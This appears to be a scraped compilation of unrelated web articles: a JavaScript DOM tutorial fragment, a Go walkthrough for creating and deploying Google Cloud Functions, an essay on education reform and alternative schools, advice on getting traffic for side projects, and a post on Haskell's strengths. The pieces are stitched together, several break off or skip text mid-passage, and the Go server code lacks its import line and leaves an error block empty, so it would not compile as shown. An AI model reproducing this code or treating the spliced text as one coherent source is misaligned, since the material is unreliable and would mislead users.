&lt;script&gt; 
  let n = document.getElementByTagName(p); 
&lt;/script&gt;</code></pre>
<h4>innerHTML</h4>
<p>The <strong>innerHTML</strong> modifies the content of an html element.</p>
<pre><code>&lt;p id="new"&gt; This is a paragraph &lt;/p&gt; 

&lt;script&gt;
  let a = document.getElementById("new").innerHTML = "This is now an innerHTML" 
&lt;/script&gt;</code></pre>
<h4>Methods for adding and removing elements </h4>
<p>The <strong>appendChild()</strong>, <strong>insertBefore()</strong> and <strong>createElement()</strong> are separate methods but usually go together. </p>
<p>The <strong>createElement()</strong> creates a new element node that doesn't reflect on the DOM document. <strong>appendChild()</strong> or <strong>insertBefore()</strong> is used to add it to the document – this is why they usually work together. <strong>insertBefore</strong> adds a node as a child element, right before the specified element, while <strong>appendChild</strong> appends a node as the last child, after the specified element. </p>
<pre><code>&lt;p&gt;Click the button to create a text in h1 &lt;p&gt; 

&lt;button onclick="myFunction()"&gt;Try it&lt;/button&gt; 

&lt;script&gt; 
  function myFunction() { 
    var btn = document.createElement("h1"); 
    document.body.appendChild(btn).innerHTML = "This!";
} 
&lt;/script&gt;</code></pre>
<h4>removeChild() and replaceChild()</h4>
<p>The <strong>removeChild()</strong> removes a specific child node while the <strong>replaceChild()</strong> replaces the specified child node with another node. The <strong>removeChild</strong> is no longer supported on the DOM, although it still works on modern browsers. Nodes removed with <strong>node.removeChild()</strong> can be inserted into another document with the <strong>importNode()</strong> or <strong>adoptNode()</strong> methods. To use them in the same document, <strong>appendChild()</strong> or <strong>insertBefore()</strong> can be used. </p>
<h2>Styling CSS Properties with .style Method</h2>
<p>Besides HTML elements, Javascript DOM manipulations can be performed on CSS using the .style method. The syntax for this is quite simple. The variable name comes before the .style keyword followed by the .cssProperty. The .style method supports most CSS3 properties. CSS properties separated by a hyphen (-) like background-color and text-align are written in camelCase when using .style method. Background-color becomes backgroundColor. </p>
<p>You can use the .style method on advanced CSS3 properties like animation. </p>
<pre><code>&lt;div&gt; Div&lt;/div&gt; 

&lt;button onclick = "func();"&gt;click &lt;/button&gt; 

&lt;script&gt; 
  function func(){  
    let div = document.querySelector("div");
    div.style.border = "5px solid yellow"; 
    div.style.backgroundColor = "purple"; 
    div.style.color = "white";
    div.style.height = "200px"; 
    div.style.width = "200px"; 
  } 
&lt;/script&gt;</code></pre>
<h2>Manipulating image objects with DOM </h2>
<p>Images can be created, styled, or altered with DOM using the DOM methods already discussed. You can set the image src, width, alt, and height and other properties using setAttribute() method.</p>
<pre><code>&lt;div class="container"&gt; 

&lt;button onclick="myFunction()"&gt;Try it&lt;/button&gt; 

&lt;script&gt;
  function myFunction(){ 
    const image = document.createElement("img"); 
    image.setAttribute("src", "https://s23444.pcdn.co/wp-content/uploads/2020/01/Africa-general-pic.jpg.optimal.jpg"); 
    image.setAttribute("height", "500") 
    document.querySelector(".container").appendChild(image) 
  } 
&lt;/script&gt;</code></pre>
<h2>Event Listeners </h2>
<p>HTML DOM document allows a trigger on a page when a code is executed. This trigger is called an event. It is usually attached to a function, and executes when the function is called. This trigger could happen on button press, page load or while data input into web form fields.<br>Javascript DOM also allows different actions to be performed on HTML elements using the addeventlistener() function. Onclick, onmouseover, ondrag, onload, onchange, onmouseout, and onkeydown are some of the common events in Javascript. They are triggers that occur when an element is clicked, mouse hovered, dragged, on page load, element change, mouse moved away from it, or when a keyboard key is pressed respectively. There are many more Javascript DOM object events that could be attached to the addeventlistener() function. You can check them up <a href="https://www.w3schools.com/jsref/dom_obj_event.asp" target="_blank" rel="nofollow">here on W3Schools</a>.<br>Using event listeners are highly encouraged when writing HTML DOM events. They are more readable, do not overwrite existing events and allow multiple events of the same type to be added to one element.</p>
<p>The following example is a simple way of using the <strong>addEventListener</strong> </p>
<pre><code>&lt;div id="new"&gt;This is an example of an an event listener&lt;/div&gt; 

&lt;button id="clickhere"&gt;click&lt;/button&gt;

&lt;script&gt; 
  button = document.getElementById("clickhere"); 
  button.addEventListener("click", func); 
  function func(){ 
    document.querySelector('div').style.color = "red"; 
  } 
&lt;/script&gt;</code></pre>
<p>The click in ("click", func) is the event to be handled by eventlistener. Mouseout, ondrag or any other event could be written in place of click; …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Cloud Functions are Google’s offering for serverless architecture (similar to AWS lambdas).</p>

<h2 id="what-is-serverless">What is serverless?</h2>

<p>Before we look into how to use Cloud Functions, we should understand some things about it.</p>

<p>Code needs servers to run, so <code>serverless</code> doesn’t mean there are no servers, it means that we don’t need to manage those servers ourselves.</p>

<p>In a usual server based architecture, we might create a service and deploy it to a machine. This service will be running in the machine all the time waiting for requests. This has the disadvantage that even if there are no requests, the machine would need to be up, and incurring cost.</p>

<p>On the other hand, if we use Cloud Functions, we write a service and register it with Google. Google will then listen to the endpoint this service cares about and will only start it when there are requests. If it detects that there haven’t been requests for some time, it will stop the service again.</p>

<!--more-->

<p>While Google Compute Engine instances are billed by time, Cloud Functions are billed by execution time. If a Cloud Function is not being executed, then it is not being billed. This sounds very attractive, but there are draw backs, namely:</p>

<ul>
  <li>Running a Compute Engine instance for a full month is most of the time cheaper than having a Cloud Function executing for one month straight. This means that if we need a service to be always doing work, it’s better to get a whole machine for it.</li>
  <li>Cloud Functions need to warm up. If a Cloud Function hasn’t been used for a while, Google will stop the server that was running it. Next time we get a new request, a new server needs to be started, which takes some time. This will make this first request take long (This time varies a lot, but usually less than 4 seconds)</li>
</ul>

<p>For these reasons, serverless shouldn’t be used in all scenarios.</p>

<h2 id="creating-a-cloud-function">Creating a Cloud Function</h2>

<p>To make it easy to work on our Cloud Function, we need a way to run the function from our development machine.</p>

<p>Let’s start by creating a module:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>mkdir test-functions
cd test-functions
go mod init test.com/functions
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now, we can create a file for our function:</p>



<p>With this content:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
</pre></td><td><pre><span>package</span> <span>functions</span>

<span>import</span> <span>(</span>
	<span>"net/http"</span>
	<span>"fmt"</span>
<span>)</span>

<span>func</span> <span>DoYouLikeTacos</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
	<span>fmt</span><span>.</span><span>Fprint</span><span>(</span><span>w</span><span>,</span> <span>"Of course I like tacos!</span><span>\n</span><span>"</span><span>)</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>To be able to test our functions from our development machine, we need to create a server. Let’s create a file for it:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>mkdir cmd
touch cmd/main.go
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And add this content:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12

</pre></td><td><pre><span>package</span> <span>main</span>

  <span>"log"</span>
  <span>"context"</span>
  <span>"github.com/GoogleCloudPlatform/functions-framework-go/funcframework"</span>
  <span>"test.com/functions"</span>
<span>)</span>

<span>func</span> <span>main</span><span>()</span> <span>{</span>
  <span>ctx</span> <span>:=</span> <span>context</span><span>.</span><span>Background</span><span>()</span>

  <span>// Our function will be executed when a request to /do-you-like-tacos is received</span>
  <span>if</span> <span>err</span> <span>:=</span> <span>funcframework</span><span>.</span><span>RegisterHTTPFunctionContext</span><span>(</span>
      <span>ctx</span><span>,</span> <span>"/do-you-like-tacos"</span><span>,</span> <span>functions</span><span>.</span><span>DoYouLikeTacos</span><span>);</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
    <span>log</span><span>.</span><span>Fatalf</span><span>(</span><span>"funcframework.RegisterHTTPFunctionContext: %v</span><span>\n</span><span>"</span><span>,</span> <span>err</span><span>)</span>
  <span>}</span>

  <span>// The server will run on port 8080</span>
  <span>port</span> <span>:=</span> <span>"8080"</span>
  <span>if</span> <span>err</span> <span>:=</span> <span>funcframework</span><span>.</span><span>Start</span><span>(</span><span>port</span><span>);</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
    <span>log</span><span>.</span><span>Fatalf</span><span>(</span><span>"funcframework.Start: %v</span><span>\n</span><span>"</span><span>,</span> <span>err</span><span>)</span>
  <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>To run the server:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>cd cmd
go run main.go
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Once the server is running, we can use curl to test it:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>curl localhost:8080/do-you-like-tacos
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The output should be:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>Of course I like tacos!
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This example is very simple, but we can have our fucntion do whatever we want.</p>

<p>We can also add more functions by adding more files and updating our <code>main.go</code> server. Let’s create another function just to show it.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>cd ..
touch cerveza.go
</pre></td></tr></tbody></table></code></pre></div></div>

<p>With this content:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
</pre></td><td><pre><span>package</span> <span>functions</span>

<span>import</span> <span>(</span>
	<span>"net/http"</span>
	<span>"fmt"</span>
<span>)</span>

<span>func</span> <span>Thirsty</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
	<span>fmt</span><span>.</span><span>Fprint</span><span>(</span><span>w</span><span>,</span> <span>"Cerveza, por favor</span><span>\n</span><span>"</span><span>)</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And add this to <code>cmd/main.go</code>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>  <span>if</span> <span>err</span> <span>:=</span> <span>funcframework</span><span>.</span><span>RegisterHTTPFunctionContext</span><span>(</span>
      <span>ctx</span><span>,</span> <span>"/thirsty"</span><span>,</span> <span>functions</span><span>.</span><span>Thirsty</span><span>);</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>

  <span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Run the server:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>cd cmd
go run main.go
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And hit the new url:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>curl localhost:8080/thirsty
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="deploying-to-google-cloud">Deploying to Google Cloud</h2>

<p>Once we have our functions ready, we want to make them available to the public by deploying them to Google Cloud.</p>

<p>From the root of our project we can use this command:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>gcloud functions deploy DoYouLikeTacos \
    --runtime go113 --trigger-http --allow-unauthenticated
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This will spit out a bunch of information. The most important part is the URL:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>httpsTrigger:
  url: https://us-central1-proj-1234567.cloudfunctions.net/DoYouLikeTacos
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can curl this endpoint, the same way we did for our local endpoint:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>curl https://us-central1-proj-1234567.cloudfunctions.net/DoYouLikeTacos
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Let’s take a closer look to the command we used to deploy our function:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>gcloud functions deploy DoYouLikeTacos \
    --runtime go113 --trigger-http --allow-unauthenticated
</pre></td></tr></tbody></table></code></pre></div></div>

<ul>
  <li><code>DoYouLikeTacos</code> is the name of the function we are deploying. The tool will search the package for a function with that name.</li>
  <li><code>--runtime go113</code> tells google to use Golang 1.13. We can see the available runtimes in the help (<code>gcloud functions deploy --help</code>)</li>
  <li><code>--trigger-http</code> means that an http endpoint will be assigned to the function</li>
  <li><code>--allow-unauthenticated</code> means that the function will be available for everybody without authentication. Note that the function code itself could expect some kind of authentication independently of this flag</li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>This was a quick introduction to Google Cloud Functions. We learned how to create a function, test it locally and deploy it to Google Cloud.</p>

<p>Complete applications can be built using Cloud Functions, so I’ll explore a little more in another article.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Our world is changing. Our problems are changing. It's time our education system did&nbsp;too. Here's my take on the reforms needed in education.</p><div><p>There is a storm brewing. And the rain clouds are hovering over the traditional school system. We’ve already seen the first droplets fall as a result of COVID-19, and it’s difficult to see a future where the downpour isn’t on the way.</p><p>The education system has been failing us for years. It is no secret that the outcome of the schooling process — “educated children” — is a complete mismatch with the outcome that this modern world requires. </p><p>We’re failing our children by subjecting them to this system, and we’re failing ourselves as humans by slowing down the overall development of our race, and everything we interact with. </p><h2>A Failed System</h2><p>To understand the education problem we’re now faced with, it’s important to understand the origins of education.</p><p>The formal education system (particularly in America) was born mainly from religion. Martin Luther was said to be the “godfather” of this. His justification was that in order for salvation to occur, people need to read the scriptures. He realized that in order for this to happen, people need to know how to read and write. This idea spread, and by the late 17th century, Germany was the leader in the development of formal education. However, the actual schooling was not handled by the state, but by the Lutheran Church.</p><blockquote>“In America, in the mid 17th century, Massachusetts became the first colony to mandate schooling, the clearly stated purpose of which was to turn children into good Puritans.” — Psychology Today</blockquote><p>As the idea of education spread, employer’s saw it as an opportunity to create educated workers for their companies. At the time, the ideal qualities of a worker were something along the lines of:</p><ul role="list"><li>Punctuality, </li><li>Obedience (take instructions),</li><li>Tolerance for long, tedious work hours,</li><li>Minimal ability to read and write.</li></ul><p>Aside from the last point, which has been significantly improve on, it’s hard to look at our formal education system (mostly) and see how it has adapted to the current world we live in, and our present day challenges.</p><h2>A Growing Trend</h2><p>The number of children being homeschooled in the UK has more than doubled in the last 5 years, according to <a href="https://www.forbes.com/sites/nickmorrison/2020/03/06/fears-children-going-off-grid-as-homeschooling-up-by-700/#27cafb9554b4" target="_blank">Forbes</a>. In some parts of the country, that number is as high as <a href="https://www.forbes.com/sites/nickmorrison/2020/03/06/fears-children-going-off-grid-as-homeschooling-up-by-700/#27cafb9554b4" target="_blank">700%</a>. This is only registered home-schoolers, which is not a requirement.</p><p>In the US, the current number of home-schooled students represents roughly 3.4% of the schooled population, or 2.3 million children. It’s expected that as a second generation of home-schoolers chooses the same for their kids, this number will expand to <a href="https://blog.steppingblocks.com/homeschooling-curriculum-and-programs-are-booming#:~:text=Homeschooling%20is%20catching%20on.,over%20the%20next%20few%20years." target="_blank">10 million by 2030.</a></p><p>Clearly, home schooling is finding popularity and traction outside of it’s traditional conservative and religious roots.</p><h2>A Changing World</h2><p>Bare with me for a second while I try illustrate a point with a personal anecdote. I left high-school 10 years ago. Throughout my schooling years, I found school particularly boring. In junior school, I remember faking stomach aches, headaches, putting my forehead above the toaster to mimic a temperature — every trick in the book to get out of school. I <em>hated </em>the monotony of it. Pretty soon I got shipped off to boarding school. </p><p>10 Years later, and I am staying with my parents during lockdown, and we became friends with our next-door neighbors, who had a daughter in Grade 11 (17 years old). She asked me for some help with her school work. </p><p>To my shock, the curriculum was all but identical to what I learned in high school. The only difference was that she had a laptop with her, and that’s how she got her notes from the teachers — no more note-packs. </p><h3>For perspective, 10 years ago…</h3><ul role="list"><li>There was no DoorDash (Founded 2013);</li><li>Amazon stock price was $139, it’s now $3162;</li></ul><figure><p><img src="https://uploads-ssl.webflow.com/5dc02eb64f3e3528360999cb/5fa1700d4b1252d4e2a1ffc8_1*29zfMBVl365WGrYKOF_AEg.png" alt=""></p><figcaption>Source: Google.com</figcaption></figure><ul role="list"><li>Scientists <a href="https://spaceplace.nasa.gov/gravitational-waves/en/#:~:text=In%202015%2C%20scientists%20detected%20gravitational,happened%201.3%20billion%20years%20ago." target="_blank">discovered gravitational waves exist</a> for the first time, when they observed two black holes colliding 1.5 billion years ago.</li><li>The only Tesla that was around was the original Roadster.

No matter the input (type of child), you get battered with information that is mostly not relevant anymore, through outdated teaching methods, and then are expected to come out a certain way (pass exams).</p><p>We’ve now reached a point in educational research that we know that all people learn differently. </p><figure><p><img src="https://uploads-ssl.webflow.com/5dc02eb64f3e3528360999cb/5fa1700e09a79a0d525bd4fe_0*YsGK_hHeWUuWkxLs.png" alt=""></p><figcaption>Source:<a href="https://digitalhumans.com/blog/the-four-types-of-learning-how-digital-humans-cater-to-all-customers/" target="_blank"> Uneeq.com</a></figcaption></figure><p>The question then becomes: <em>So, what are the alternatives?</em></p><h3>Montessori</h3><p>Founded on the teaching principles of Dr Maria Montessori — the first female physician in Italy — the premise is that children are naturally inquisitive. They are born with “absorbent” minds, and will embark on self-directed learning if given the opportunity to do so.</p><p>Montessori’s are primarily at the pre-school and primary school level, and their ‘classrooms’ are prepared environments which allow children to seek out opportunities to learn on their own. The teachers are there as facilitators and observers. The children are allowed to concentrate for long periods of time on certain tasks, rather than being interrupted by a teacher-driven model of learning with class changes and interruptions— a foundation of the Montessori way of teaching. </p><p>The “Montessori method” is used in over 5000 schools in the US today. <a href="https://www.researchgate.net/publication/324261991_Academic_Achievement_Outcomes_A_Comparison_of_Montessori_and_Non-Montessori_Public_Elementary_School_Students" target="_blank">A 2006 study</a> where a public Montessori school was compared to traditional public schools yielded results that the Montessori students yielded better academic results overall. Google co-founders, Sergey Brin and Larry Paige are both examples of the positive results that the Montessori method can yield.</p><h3>The Steiner/Waldorf Method</h3><p>Rudolf Steiner was the mind behind the “Steiner/Waldorf” method which emphasizes the importance of the development of the “whole child”. Steiner theorized that children developed in 7 year periods, and their education should be structure as such:</p><ul role="list"><li>The first 7 years of a child’s life are based around “imitative and sensory-based” learning, and should be devoted mainly to a child’s non-cognitive abilities.</li><li>Ages 7 to 14, creativity and imagination are emphasized.</li><li>From 14 onwards, students are ready for a more structure learning environment which “stresses social responsibility”.</li></ul><p>Steiner founded his first Waldorf school in Germany in 1919. The original curriculum was for 12 years, with an emphasis on preparation for “living”. Within 10 years, Steiner’s Waldorf school was the largest private school in Germany. When World War II hit, Waldorf teachers fled to neighboring countries, and the method spread.</p><p>There are however some criticisms of the Waldorf method, which say that it borders on being too religious. </p><h3>Reggio Emilia</h3><p>Sharing a lot of the same principles as the Montessori Method, Reggio Emilia also has its roots in a post World War II world. The method is primarily aimed at children aged 3 to 6. </p><p>The first Reggio Emilia preschool opened in 1945, and became popular in the US in 1991.</p><p>The Reggio Emilia way of teaching has the following features:</p><ul role="list"><li>Parents take an active role in education;</li><li>Schools are designed to look and feel like “home”</li><li>Curriculums are flexible;</li><li>Growth on the student’s terms is paramount.</li><li>Art is a big component, with almost all RE schools having a dedicated art teacher who is their creative ‘guide’.</li></ul><blockquote>“Reggio Emilia is about full-blown human potential and how you support that in both intellectual and creative terms.”- Louis Boyd Cadwell (Teacher at RE school’s in Italy during the 90's)</blockquote><h3>Sudbury </h3><p>Sudbury schools are unique in their emphasis of individuality and democracy. They take this to the next level. Sudbury students have complete control over what they do, and what they learn at school. All students and teachers vote on almost everything relating to the schooling process:</p><ul role="list"><li>Budget,</li><li>Curriculum, </li><li>Teacher hiring/firing.</li></ul><p>The premise is that students are capable of making sound collective decisions. In the event that they don’t, they learn through the consequences of their mistakes. </p><p>Sudbury Schools rely on the premise that students are inherently motivated to learn. Their reasoning is often backed by the idea that an infant child learns to walk, rather than spending it’s whole life lying down in it’s crib — which is a viable, and easier, option.</p><h2>Predictions for the Future</h2><p>The issue with all of these alternative learning methods is that they don’t align with the way companies are viewing graduates. Traditionally, you would have to go through school in order to get a certain qualification. That qualification would give you a ‘stamp’ which a company could look at and gauge how well you may be able to do the job. </p><p>That is slowly changing. Alternative education institutions like Lambda School are changing the way companies are hiring. It’s no longer necessary for front-end developers to have a secondary education at all. If you’ve got the skills to do the job — it doesn’t matter to them how you got them. </p><p>The same applies in the marketing world. If you are a creative thinker that can create designs and think laterally where no one else can — your education doesn’t …</p></div></div>

November 3, 2020 | https://blog.moeminmamdouh.com/how-to-drive-traffic-to-your-website-side-project-edition | <a href="https://web.archive.org/web/*/https://blog.moeminmamdouh.com/how-to-drive-traffic-to-your-website-side-project-edition">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>You've been working on your side project for nearly 6 months now, launch date's today. You're super excited to show the world what you've been working on, you hit the launch button and...no traffic or users at all.</p>


<p>It's a common problem. Us IndieHackers <em>know</em> where to advertise our products, but not all of us know <em>how</em> to post our products. I've split up this blog post to two <strong>categories</strong>: </p>
<p> 👉 How to get a huge traffic boost for a short period of time with little to no work.
 👉 How to get steady traffic by using long-term strategies. </p>

<p>This is a great way to not only gain traffic, but also to validate your idea (if you haven't already). There are hundreds of directories all over the internet that you can post your side project to and in return get huge traffic boosts. Let me go over where to post your side projects, the pros and cons of posting on said websites, and <em>how</em> to post on said websites.</p>
<h3 id="where-to-post-your-side-projects">Where To Post Your Side Projects</h3>
<ul>
<li><a target="_blank" href="https://www.reddit.com/">Reddit</a></li>
<li><a target="_blank" href="https://news.ycombinator.com/">HackerNews</a></li>
<li><a target="_blank" href="https://www.producthunt.com/">ProductHunt</a></li>
<li><a target="_blank" href="https://betalist.com/">Betalist</a></li>
<li><a target="_blank" href="https://betapage.co/">Betapage</a></li>
<li><a target="_blank" href="https://www.sideprojectors.com/">Sideprojectors</a>, yes, you can showcase your projects on Sideprojectors.</li>
<li><a target="_blank" href="https://launched.io/SubmitStartup">Launched</a></li>
<li><a target="_blank" href="https://www.saashub.com/">SaaSHub</a></li>
</ul>
<p>There are hundreds more websites you can submit your side projects to, but let's keep it simple for the sake of keeping this blog post short and sweet.</p>
<h3 id="pros-and-cons-of-posting-on-directories">Pros and Cons of Posting On Directories</h3>
<p><strong>Pros:</strong></p>
<ul>
<li>Free huge traffic boost and all that comes with it. Be it sales, newsletter subscriptions, etc.</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Short term traffic. You could very well succeed on Reddit, HackerNews, and ProductHunt and you'd be set for a good week or so, but it'll be drought season afterwards.</li>
<li>Wrong audience. You're not necessarily targeting the 'optimal' audience by posting your side project on all these websites. </li>
</ul>
<p>Should you do it? Short answer, yes. Long answer, yes. Despite the low quality of traffic, you'll still be seeing a good portion of your target audience on these platforms. You're not really paying to submit on these platforms, so do it, if it works, good on you. If not, you should have a backup plan (second category in this blog post). </p>
<h3 id="how-to-post-on-these-platforms">How To Post On These Platforms</h3>
<p>I've been waiting for this section. Let's assume you're releasing a website performance monitoring tool called Monitr. Things you should not do:</p>
<p>❌ Do not post your URL on all platforms meaninglessly. </p>
<p>Yup, that's it. So how do you share your product? Well, on websites such as ProductHunt, BetaPage and so on, there really isn't much you can do other than post the URL, but on community-based websites such as IndieHackers, Reddit, and HackerNews, there's so much room for creativity.</p>
<p>i.e. A post about website performance and its role in improving organic traffic with a link at the end of the article. More often than not, well thought out articles will rise to the top and your link will gain exposure. If not, you've added value to the community and you aren't really spamming your link. The mods will not be on your back.</p>
<p>Repurpose the content, you've written the blog post, will you go post that 1000+ article on Facebook/Twitter? No, try to make a simple graphic that will hook people and add your website's link within that graphic and the first comment. People on Facebook generally have low attention spans, so if you don't really grab their attention in the first few seconds they see your post, they're gone. </p>
<p>The point of this sub-section is to tell you to <em>learn</em> the platform before mindlessly spamming your links. </p>

<p>My #1 lesson learned from my side projects which you can read all about <a target="_blank" href="https://blog.moeminmamdouh.com/how-i-failed-2-side-projects-in-under-a-year-and-lessons-learned">here</a>. What do I mean by long-term strategies? SEO. </p>
<p>SEO is a waiting game. You post your content, and you wait to rank on Google, but you don't just go posting about <em>anything</em>, you need to be smart about what you're writing about.</p>
<h3 id="pick-high-volume-low-competition-keywords">Pick high volume, low competition keywords.</h3>
<p>For example, my last article <a target="_blank" href="https://blog.moeminmamdouh.com/20-free-design-resources-for-developers">20+ Free Design Resources for Developers</a> targeted the keywords 'free design resources'. According to Google Keywords, it receives 1k-10k search queries per month and has low competition, and well, it was a great pick. I'm currently the 10th result on Google for that keyword.</p>
<h3 id="write-valuable-posts">Write valuable posts</h3>
<p>If you provide value, you will get noticed. I went ahead and posted my free design resources article on IndieHackers, <a href="http://dev.to/" target="_blank">dev.to</a>, and HN just for the fun of it. I get around ~250 visitors from posting on there. Great, I head to bed, wake up and check my notifications only to find this:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604472876194/lKGEdkJFO.png?auto=format&amp;q=60" alt="Mask Group 1.png"></p>
<p>So what's so surprising? Well, the traffic sources. I only posted on 3 websites. But I open up the acquisition tab and to my surprise, my 2nd most traffic source is from a website that featured my article that I didn't even know about.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604473073706/DsH_DxO5S.png?auto=format&amp;q=60" alt="Mask Group 4.png"></p>
<p><strong>174 visitors came from traffic sources I did not submit my article to.</strong> The article was picked because it received attention on the 3 websites I posted to. Here are the stats for the article on IndieHackers and <a href="http://dev.to/" target="_blank">dev.to</a></p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604473233181/1Q82l3LSp.png?auto=format&amp;q=60" alt="Mask Group 1.png"></p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604473303797/YWjWoKvz2.png?auto=format&amp;q=60" alt="Mask Group 2.png"></p>
<p>So I post the article hoping for some short term traffic, but what I didn't know is that it brought longer short term traffic. But wait, wasn't this a short term strategy? Yes, but also no.</p>
<p>You're also building backlinks this way. When a high domain authory website such as daily.dev features your website and links back to your website, that is <strong>great</strong> news.</p>
<h3 id="setup-search-console-and-keep-track-of-your-organic-traffic">Setup Search Console and Keep Track Of Your Organic Traffic</h3>
<p>Search Console takes longer times to crawl new websites so you may find the results to be a little off at the beginning, that's fine. Set it up anyway, it's a very helpful tool. You get to see what keywords you're gaining impressions for, how many clicks you're getting, and what keywords are getting those clicks.</p>
<p>SEO is a long and tiring game, but once you start seeing results it's a great feeling. You no longer have to worry about constantly trying to find sources of traffic, they just roll in. Let me know <strong>your</strong> traffic game in the comments below and I hope you enjoyed this article!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There’s been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it’s ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That’s how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It’s really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it’s highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it’s finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there’s now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
